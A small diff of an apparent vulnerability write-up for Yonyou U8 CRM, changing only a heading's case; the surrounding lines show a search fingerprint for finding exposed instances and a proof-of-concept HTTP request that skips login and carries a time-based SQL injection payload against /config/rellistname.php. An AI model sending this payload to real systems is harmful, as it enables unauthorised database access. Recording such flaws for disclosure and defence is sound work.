@@ -8,7 +8,7 @@
 body="用友U8CRM" || body="/js/tfunction.js" || title="用友U8CRM"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /config/rellistname.php?DontCheckLogin=1&objType=1&reportID=1+wAiTFOR+DeLAy'0:0:4'--+- HTTP/1.1
